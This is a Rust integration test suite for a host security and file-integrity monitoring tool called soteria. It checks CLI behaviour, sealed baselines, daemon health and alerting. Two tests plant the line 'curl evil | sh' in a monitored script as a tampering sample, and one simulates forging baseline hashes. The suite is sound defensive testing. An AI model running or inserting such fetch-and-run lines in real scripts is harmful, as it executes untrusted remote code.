//! End-to-end tests of the `soteria` binary against a temporary
//! configuration and database.

use std::path::PathBuf;
use std::process::{Child, Command as StdCommand, Stdio};
use std::time::{Duration, Instant};

use assert_cmd::Command;
use predicates::prelude::*;
use serde_json::Value;

struct Env {
    dir: tempfile::TempDir,
    config: PathBuf,
}

impl Env {
    fn new() -> Env {
        let dir = tempfile::tempdir().unwrap();
        let config = dir.path().join("soteria.toml");
        let env = Env { dir, config };
        std::fs::create_dir_all(env.root().join("bin")).unwrap();
        std::fs::create_dir_all(env.root().join("etc")).unwrap();
        std::fs::write(env.root().join("bin/tool"), b"#!/bin/sh\necho v1\n").unwrap();
        std::fs::write(env.root().join("etc/app.conf"), b"setting = 1\n").unwrap();
        env.write_config("");
        env
    }

    /// Stand-in for the monitored filesystem.
    fn root(&self) -> PathBuf {
        self.dir.path().join("root")
    }

    fn db(&self) -> PathBuf {
        self.dir.path().join("state").join("soteria.db")
    }

    /// Default configuration pointing at a temporary database, plus `extra`
    /// TOML appended to the [alerts] table (the last table in the file).
    fn write_config(&self, extra: &str) {
        let mut text = soteria_default_config()
            .replace("/var/lib/soteria/soteria.db", self.db().to_str().unwrap())
            .replace(
                "/etc/soteria/keys",
                self.dir.path().join("keys").to_str().unwrap(),
            );
        // Monitor only the temporary root, not the real system.
        let start = text.find("include = [").unwrap();
        let end = start + text[start..].find(']').unwrap() + 1;
        text.replace_range(
            start..end,
            &format!("include = [{:?}]", self.root().to_str().unwrap()),
        );
        std::fs::write(&self.config, format!("{text}{extra}")).unwrap();
    }

    fn cmd(&self) -> Command {
        let mut c = Command::cargo_bin("soteria").unwrap();
        c.env("SOTERIA_CONFIG", &self.config)
            .env_remove("NOTIFY_SOCKET")
            .env("NO_COLOR", "1");
        c
    }

    fn json(&self, args: &[&str]) -> (i32, Value) {
        let out = self.cmd().arg("--json").args(args).output().unwrap();
        let v = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
            panic!(
                "{args:?}: invalid JSON ({e}): {}",
                String::from_utf8_lossy(&out.stdout)
            )
        });
        (out.status.code().unwrap(), v)
    }

    fn init(&self) {
        self.cmd()
            .arg("init")
            .assert()
            .code(predicate::in_iter([0, 1]));
    }

    fn spawn_daemon(&self) -> Child {
        StdCommand::new(assert_cmd::cargo::cargo_bin("soteria"))
            .arg("daemon")
            .env("SOTERIA_CONFIG", &self.config)
            .env_remove("NOTIFY_SOCKET")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap()
    }
}

fn soteria_default_config() -> String {
    let out = Command::cargo_bin("soteria")
        .unwrap()
        .args(["config", "default"])
        .output()
        .unwrap();
    String::from_utf8(out.stdout).unwrap()
}

fn wait_until(what: &str, mut f: impl FnMut() -> bool) {
    let start = Instant::now();
    while !f() {
        assert!(
            start.elapsed() < Duration::from_secs(10),
            "timed out waiting for {what}"
        );
        std::thread::sleep(Duration::from_millis(50));
    }
}

#[test]
fn help_lists_all_srs_subcommands_and_exit_codes() {
    let assert = Command::cargo_bin("soteria")
        .unwrap()
        .arg("--help")
        .assert()
        .success();
    let out = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    for sub in [
        "status",
        "init",
        "scan",
        "baseline",
        "inventory",
        "events",
        "alerts",
        "processes",
        "rules",
        "config",
        "report",
        "verify",
    ] {
        assert!(
            out.contains(&format!("  {sub} ")),
            "missing subcommand {sub}"
        );
    }
    assert!(out.contains("Exit codes:"));
}

#[test]
fn every_subcommand_has_help() {
    for sub in [
        "status",
        "init",
        "scan",
        "baseline",
        "inventory",
        "events",
        "alerts",
        "processes",
        "rules",
        "config",
        "report",
        "verify",
        "daemon",
    ] {
        Command::cargo_bin("soteria")
            .unwrap()
            .args([sub, "--help"])
            .assert()
            .success();
    }
    for sub in ["list", "show", "create", "review", "approve", "diff"] {
        Command::cargo_bin("soteria")
            .unwrap()
            .args(["baseline", sub, "--help"])
            .assert()
            .success();
    }
}

#[test]
fn usage_errors_exit_2() {
    Command::cargo_bin("soteria")
        .unwrap()
        .arg("frobnicate")
        .assert()
        .code(2);
    Command::cargo_bin("soteria")
        .unwrap()
        .args(["scan", "--full", "--kernel"])
        .assert()
        .code(2);
}

#[test]
fn config_default_validates_cleanly() {
    let env = Env::new();
    env.cmd()
        .args(["config", "validate"])
        .assert()
        .code(predicate::in_iter([0, 1])) // notes/warnings depend on the host's paths
        .stdout(predicate::str::contains("is valid"));
}

#[test]
fn invalid_config_is_reported_with_exit_3() {
    let env = Env::new();
    env.write_config("bogus = true\n");
    env.cmd()
        .args(["config", "validate"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("unknown field `bogus`"));

    env.write_config("");
    std::fs::write(
        &env.config,
        std::fs::read_to_string(&env.config)
            .unwrap()
            .replace("event_retention_days = 90", "event_retention_days = 0"),
    )
    .unwrap();
    let (code, v) = env.json(&["config", "validate"]);
    assert_eq!(code, 3);
    assert_eq!(v["valid"], false);
    assert_eq!(v["issues"][0]["field"], "general.event_retention_days");
}

#[test]
fn missing_config_exits_3() {
    Command::cargo_bin("soteria")
        .unwrap()
        .args(["--config", "/nonexistent/soteria.toml", "config", "show"])
        .assert()
        .code(3)
        .stderr(predicate::str::contains("not found"));
}

#[test]
fn status_before_init_exits_5() {
    let env = Env::new();
    let (code, v) = env.json(&["status"]);
    assert_eq!(code, 5);
    assert_eq!(v["protection"], "not_initialized");
    assert_eq!(v["database"]["state"], "not_initialized");
}

#[test]
fn init_creates_private_database_and_is_repeatable() {
    let env = Env::new();
    let (code, v) = env.json(&["init"]);
    assert!(code == 0 || code == 1, "init exit {code}: {v}");
    assert_eq!(v["schema_version"], 1);
    assert_eq!(v["migrations_applied"], serde_json::json!([1]));

    use std::os::unix::fs::PermissionsExt;
    let mode = std::fs::metadata(env.db()).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600);
    let dir_mode = std::fs::metadata(env.db().parent().unwrap())
        .unwrap()
        .permissions()
        .mode()
        & 0o777;
    assert_eq!(dir_mode, 0o750);

    let (_, v) = env.json(&["init"]);
    assert_eq!(v["migrations_applied"], serde_json::json!([]));
}

#[test]
fn init_refuses_invalid_config() {
    let env = Env::new();
    env.write_config("minimum_severity_typo = 1\n");
    env.cmd().arg("init").assert().code(3);
    assert!(!env.db().exists());
}

#[test]
fn status_after_init_reports_no_baseline() {
    let env = Env::new();
    env.init();
    let (code, v) = env.json(&["status"]);
    assert_eq!(code, 1, "{v}");
    assert_eq!(v["database"]["state"], "ok");
    assert_eq!(v["baseline"]["established"], false);
    assert_eq!(v["protection"], "inactive");
    assert_eq!(v["monitoring"]["state"], "never_started");
    assert_eq!(v["indexed_files"], 5);

    env.cmd()
        .arg("status")
        .assert()
        .stdout(predicate::str::contains("SOTERIA HOST SECURITY"))
        .stdout(predicate::str::contains("Baseline: NOT ESTABLISHED"));
}

#[test]
fn verify_reports_database_checks() {
    let env = Env::new();
    env.init();
    let (code, v) = env.json(&["verify", "--component", "database"]);
    assert_eq!(code, 0, "{v}");
    let names: Vec<&str> = v["checks"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| c["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["schema", "integrity", "permissions"]);
    assert_eq!(v["result"], "pass");
}

#[test]
fn verify_detects_corrupt_database() {
    let env = Env::new();
    env.init();
    std::fs::write(env.db(), b"this is not a database").unwrap();
    let (code, v) = env.json(&["verify", "--component", "database"]);
    assert_eq!(code, 4, "{v}");
    assert_eq!(v["result"], "fail");
}

#[test]
fn verify_before_init_exits_5() {
    let env = Env::new();
    let (code, _) = env.json(&["verify", "--component", "database"]);
    assert_eq!(code, 5);
}

#[test]
fn unavailable_commands_exit_7_with_json_error() {
    let env = Env::new();
    for args in [
        vec!["scan", "--kernel"],
        vec!["alerts", "ack", "1"],
        vec!["alerts", "export"],
        vec!["processes"],
        vec!["rules", "list"],
        vec!["report", "summary"],
    ] {
        let (code, v) = env.json(&args);
        assert_eq!(code, 7, "{args:?}");
        assert_eq!(v["kind"], "unavailable");
        assert!(v["message"].as_str().unwrap().contains("milestone"));
    }
}

#[test]
fn daemon_refuses_to_start_without_init() {
    let env = Env::new();
    env.cmd()
        .arg("daemon")
        .assert()
        .code(5)
        .stderr(predicate::str::contains("soteria init"));
}

#[test]
fn daemon_refuses_invalid_config() {
    let env = Env::new();
    env.init();
    env.write_config("journal = \"maybe\"\n");
    env.cmd().arg("daemon").assert().code(3);
}

#[test]
fn daemon_runs_reports_health_and_stops_cleanly() {
    let env = Env::new();
    env.init();
    let mut child = env.spawn_daemon();

    wait_until("agent running", || {
        let (_, v) = env.json(&["status"]);
        v["monitoring"]["state"] == "running"
    });
    let (_, v) = env.json(&["status"]);
    let fs = v["sensors"]
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["sensor"] == "fs")
        .unwrap_or_else(|| panic!("no fs sensor: {v}"));
    assert_eq!(fs["state"], "running", "{v}");
    assert!(v["agent"]["fs_sensor_state"].is_string(), "{v}");

    // A change is seen live and recorded as an event, even without an
    // approved baseline (there is nothing to alert against yet).
    std::fs::write(env.root().join("etc/app.conf"), b"setting = 2\n").unwrap();
    wait_until("file.modified event", || {
        let (_, v) = env.json(&["events", "--type", "file"]);
        v["events"].as_array().unwrap().iter().any(|e| {
            e["type"] == "file.modified" && e["path"].as_str().unwrap().ends_with("etc/app.conf")
        })
    });
    let (code, v) = env.json(&["verify", "--component", "sensors"]);
    assert!(
        v["checks"]
            .as_array()
            .unwrap()
            .iter()
            .any(|c| c["name"] == "fs_sensor" && c["state"] == "pass"),
        "{code} {v}"
    );

    // SIGTERM via kill(1): the workspace forbids unsafe code, so no libc.
    let ok = StdCommand::new("kill")
        .args(["-TERM", &child.id().to_string()])
        .status()
        .unwrap()
        .success();
    assert!(ok);
    let status = child.wait().unwrap();
    assert_eq!(status.code(), Some(0));

    let (_, v) = env.json(&["status"]);
    assert_eq!(v["monitoring"]["state"], "stopped");
}

#[test]
fn crashed_daemon_is_reported_not_responding() {
    let env = Env::new();
    env.init();
    let mut child = env.spawn_daemon();
    wait_until("agent running", || {
        let (_, v) = env.json(&["status"]);
        v["monitoring"]["state"] == "running"
    });
    child.kill().unwrap(); // SIGKILL: no clean shutdown record
    child.wait().unwrap();

    // Age the heartbeat past the staleness limit.
    rusqlite::Connection::open(env.db())
        .unwrap()
        .execute(
            "UPDATE meta SET value = '2000-01-01T00:00:00.000Z' WHERE key = 'agent_heartbeat'",
            [],
        )
        .unwrap();
    let (code, v) = env.json(&["verify", "--component", "service"]);
    assert_eq!(v["checks"][0]["state"], "fail", "{v}");
    assert_eq!(code, 4);
    let (_, v) = env.json(&["status"]);
    assert_eq!(v["monitoring"]["state"], "not_responding");
}

#[test]
fn events_and_alerts_queries() {
    let env = Env::new();
    env.init();
    let (code, v) = env.json(&["events", "--since", "1h", "--severity", "info"]);
    assert_eq!(code, 0, "{v}");
    assert!(v["events"].is_array());
    let (code, v) = env.json(&["alerts", "list", "--status", "open"]);
    assert_eq!(code, 0, "{v}");
    assert_eq!(v["total_matching"], 0);
    env.cmd()
        .args(["alerts", "list"])
        .assert()
        .success()
        .stdout(predicate::str::contains("No alerts match."));

    let (code, _) = env.json(&["alerts", "show", "42"]);
    assert_eq!(code, 2);
    for bad in [
        vec!["events", "--since", "yesterday-ish"],
        vec!["events", "--severity", "urgent"],
        vec!["alerts", "list", "--status", "pending"],
    ] {
        let (code, v) = env.json(&bad);
        assert_eq!(code, 2, "{bad:?}: {v}");
    }
}

fn is_root() -> bool {
    std::fs::read_to_string("/proc/self/status")
        .ok()
        .and_then(|s| {
            s.lines()
                .find(|l| l.starts_with("Uid:"))
                .and_then(|l| l.split_whitespace().nth(2).map(|u| u == "0"))
        })
        .unwrap_or(false)
}

/// Baseline approval needs root (only root can read the signing key).
/// Tests that approve are skipped when run unprivileged; the sealing logic
/// itself is covered by unit tests in soteria-integrity.
macro_rules! require_root {
    () => {
        if !is_root() {
            eprintln!("skipping: baseline approval requires root");
            return;
        }
    };
}

impl Env {
    fn init_approved(&self) {
        let (code, v) = self.json(&["init", "--yes"]);
        assert!(code == 0 || code == 1, "init exit {code}: {v}");
        assert_eq!(v["baseline"]["state"], "approved", "{v}");
    }
}

#[test]
fn init_without_terminal_leaves_a_draft() {
    let env = Env::new();
    let (code, v) = env.json(&["init"]);
    assert_eq!(code, 1, "{v}");
    assert_eq!(v["baseline"]["state"], "draft");
    assert!(v["next"].as_str().unwrap().contains("baseline approve 1"));
    assert_eq!(v["scan"]["checked"], 5); // root, bin, etc and two files

    let (_, v) = env.json(&["baseline", "list"]);
    assert_eq!(v.as_array().unwrap().len(), 1);
    // Status does not claim protection without an approved baseline.
    let (_, v) = env.json(&["status"]);
    assert_eq!(v["baseline"]["established"], false);
    assert_eq!(v["integrity"], "NO BASELINE");
}

#[test]
fn approval_without_terminal_requires_yes() {
    require_root!();
    let env = Env::new();
    env.cmd()
        .args(["init", "--non-interactive"])
        .assert()
        .code(1);
    env.cmd()
        .args(["baseline", "approve", "1"])
        .assert()
        .code(2)
        .stderr(predicate::str::contains("--yes"));
    env.cmd()
        .args(["baseline", "approve", "1", "--yes"])
        .assert()
        .success();
    // A sealed version cannot be approved again.
    env.cmd()
        .args(["baseline", "approve", "1", "--yes"])
        .assert()
        .code(2);
}

#[test]
fn init_yes_seals_a_verifiable_baseline() {
    require_root!();
    let env = Env::new();
    env.init_approved();
    let (code, v) = env.json(&["verify", "--component", "baseline"]);
    assert_eq!(code, 0, "{v}");
    assert_eq!(v["checks"][0]["name"], "seal");
    assert_eq!(v["checks"][0]["state"], "pass");

    let (_, v) = env.json(&["status"]);
    assert_eq!(v["baseline"]["established"], true);
    assert_eq!(v["integrity"], "VERIFIED");

    let (code, v) = env.json(&["baseline", "show"]);
    assert_eq!(code, 0);
    assert_eq!(v["verification"]["valid"], true);
    assert_eq!(v["baseline"]["approved_uid"], 0);

    // Running init again keeps the approved baseline.
    let (_, v) = env.json(&["init"]);
    assert_eq!(v["baseline"]["version"], 1);
    assert_eq!(v["baseline"]["state"], "approved");
}

#[test]
fn baseline_scan_detects_tampering() {
    require_root!();
    let env = Env::new();
    env.init_approved();
    let (code, v) = env.json(&["scan", "--baseline"]);
    assert_eq!(code, 0, "{v}");
    assert_eq!(v["baseline"]["summary"]["total"], 0);

    std::fs::write(env.root().join("bin/tool"), b"#!/bin/sh\ncurl evil | sh\n").unwrap();
    std::fs::remove_file(env.root().join("etc/app.conf")).unwrap();
    std::fs::write(env.root().join("bin/dropper"), b"x").unwrap();

    let (code, v) = env.json(&["scan", "--baseline"]);
    assert_eq!(code, 1, "{v}");
    let changes = v["baseline"]["changes"].as_array().unwrap();
    let find = |name: &str| {
        changes
            .iter()
            .find(|c| c["path"].as_str().unwrap().ends_with(name))
            .unwrap_or_else(|| panic!("no change for {name}: {v}"))
    };
    assert_eq!(
        find("bin/tool")["kinds"],
        serde_json::json!(["content_modified"])
    );
    assert_eq!(
        find("etc/app.conf")["kinds"],
        serde_json::json!(["missing"])
    );
    assert_eq!(find("bin/dropper")["kinds"], serde_json::json!(["new"]));

    // The same differences are visible through baseline diff.
    let (code, v) = env.json(&["baseline", "diff", "1"]);
    assert_eq!(code, 1);
    assert!(v["summary"]["total"].as_u64().unwrap() >= 3);
}

#[test]
fn rebaselining_keeps_history() {
    require_root!();
    let env = Env::new();
    env.init_approved();
    std::fs::write(env.root().join("etc/app.conf"), b"setting = 2\n").unwrap();
    env.cmd().args(["scan"]).assert().success();
    let (_, v) = env.json(&["baseline", "create", "--note", "config change"]);
    assert_eq!(v["compared_to"], 1);
    assert!(v["changes"]["total"].as_u64().unwrap() >= 1);
    env.cmd()
        .args(["baseline", "approve", "2", "--yes"])
        .assert()
        .success();

    let (_, v) = env.json(&["baseline", "list"]);
    let states: Vec<&str> = v
        .as_array()
        .unwrap()
        .iter()
        .map(|b| b["state"].as_str().unwrap())
        .collect();
    assert_eq!(states, vec!["superseded", "approved"]);
    let (code, v) = env.json(&["baseline", "diff", "1", "2"]);
    assert_eq!(code, 1);
    assert!(
        v["changes"]
            .as_array()
            .unwrap()
            .iter()
            .any(|c| c["path"].as_str().unwrap().ends_with("etc/app.conf"))
    );
}

#[test]
fn tampered_baseline_fails_verification() {
    require_root!();
    let env = Env::new();
    env.init_approved();
    // An attacker with write access to the database file rewrites a hash.
    let conn = rusqlite::Connection::open(env.db()).unwrap();
    conn.execute_batch(
        "DROP TRIGGER baseline_entries_sealed_no_update;
         UPDATE baseline_entries SET sha256 = 'forged' WHERE sha256 IS NOT NULL;",
    )
    .unwrap();
    drop(conn);

    let (code, v) = env.json(&["verify", "--component", "baseline"]);
    assert_eq!(code, 4, "{v}");
    assert!(
        v["checks"][0]["detail"]
            .as_str()
            .unwrap()
            .contains("digest")
    );
    let (code, v) = env.json(&["status"]);
    assert_eq!(code, 4);
    assert_eq!(v["integrity"], "FAILED");
    // A baseline scan refuses to compare against a broken seal.
    env.cmd().args(["scan", "--baseline"]).assert().code(4);
}

#[test]
fn approval_requires_root() {
    if is_root() {
        return; // covered by the other tests
    }
    let env = Env::new();
    env.cmd().arg("init").assert().code(1);
    env.cmd()
        .args(["baseline", "approve", "1", "--yes"])
        .assert()
        .code(6)
        .stderr(predicate::str::contains("requires root"));
}

#[test]
fn inventory_lists_and_filters() {
    let env = Env::new();
    env.cmd().arg("init").assert().code(1);
    let (code, v) = env.json(&["inventory"]);
    assert_eq!(code, 0);
    assert_eq!(v["total_matching"], 5);

    let (_, v) = env.json(&["inventory", "--kind", "script"]);
    assert_eq!(v["total_matching"], 1);
    assert!(
        v["entries"][0]["path"]
            .as_str()
            .unwrap()
            .ends_with("bin/tool")
    );
    assert_eq!(v["entries"][0]["sha256"].as_str().unwrap().len(), 64);

    let etc = env.root().join("etc");
    let (_, v) = env.json(&["inventory", "--path", etc.to_str().unwrap()]);
    assert_eq!(v["total_matching"], 2); // etc and etc/app.conf

    let sha = "c2a6e9e2b3b2f2d7a5c3f2f1d0e9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1";
    let (_, v) = env.json(&["inventory", "--sha256", sha]);
    assert_eq!(v["total_matching"], 0);

    env.cmd()
        .args(["inventory", "--kind", "nonsense"])
        .assert()
        .code(2);
}

#[test]
fn scan_reports_and_records_history() {
    let env = Env::new();
    env.cmd().arg("init").assert().code(1);
    let (code, v) = env.json(&["scan"]);
    assert_eq!(code, 0, "{v}");
    assert_eq!(v["scan"]["type"], "full");
    assert_eq!(v["scan"]["result"], "completed");
    assert_eq!(v["scan"]["checked"], 5);

    let file = env.root().join("bin/tool");
    let (_, v) = env.json(&["scan", "--file", file.to_str().unwrap()]);
    assert_eq!(v["scan"]["type"], "file");
    assert_eq!(v["scan"]["checked"], 1);

    // Without an approved baseline there is nothing to compare against.
    env.cmd().args(["scan", "--baseline"]).assert().code(5);
}

#[test]
fn unreadable_paths_are_reported_as_gaps() {
    if is_root() {
        return; // root can read everything
    }
    use std::os::unix::fs::PermissionsExt;
    let env = Env::new();
    let secret = env.root().join("secret");
    std::fs::create_dir(&secret).unwrap();
    std::fs::write(secret.join("x"), b"x").unwrap();
    std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o000)).unwrap();
    env.cmd().arg("init").assert().code(1);
    let (code, v) = env.json(&["scan"]);
    assert_eq!(code, 1);
    assert_eq!(v["scan"]["result"], "completed_with_gaps");
    assert_eq!(v["scan"]["gaps"][0]["kind"], "inaccessible");
    let (_, v) = env.json(&["verify", "--component", "baseline"]);
    assert!(
        v["checks"]
            .as_array()
            .unwrap()
            .iter()
            .any(|c| c["component"] == "coverage" && c["name"] == "inaccessible")
    );
    std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o755)).unwrap();
}

#[test]
fn daemon_alerts_on_live_change() {
    require_root!();
    let env = Env::new();
    env.init_approved();
    let mut child = env.spawn_daemon();
    wait_until("agent running", || {
        let (_, v) = env.json(&["status"]);
        v["monitoring"]["state"] == "running" && v["agent"]["last_reconciliation"].is_string()
    });

    std::fs::write(env.root().join("bin/tool"), b"#!/bin/sh\ncurl evil | sh\n").unwrap();
    let mut id = 0;
    wait_until("FIM-003 alert", || {
        let (_, v) = env.json(&["alerts", "list"]);
        match v["alerts"]
            .as_array()
            .unwrap()
            .iter()
            .find(|a| a["rule_id"] == "FIM-003")
        {
            Some(a) => {
                id = a["id"].as_u64().unwrap();
                true
            }
            None => false,
        }
    });
    let (code, v) = env.json(&["alerts", "show", &id.to_string()]);
    assert_eq!(code, 0, "{v}");
    assert!(v["object"].as_str().unwrap().ends_with("bin/tool"));
    assert_eq!(v["evidence"]["source"], "fs_event", "{v}");
    assert_ne!(
        v["evidence"]["baseline"]["sha256"], v["evidence"]["current"]["sha256"],
        "{v}"
    );
    assert_eq!(v["history"][0]["action"], "created");
    env.cmd()
        .args(["alerts", "show", &id.to_string()])
        .assert()
        .success()
        .stdout(predicate::str::contains("Recommendation"));

    // Status reports the open alert as a finding.
    let (code, v) = env.json(&["status"]);
    assert_eq!(code, 1);
    assert!(v["open_alerts"]["total"].as_u64().unwrap() >= 1, "{v}");

    child.kill().unwrap();
    child.wait().unwrap();
}
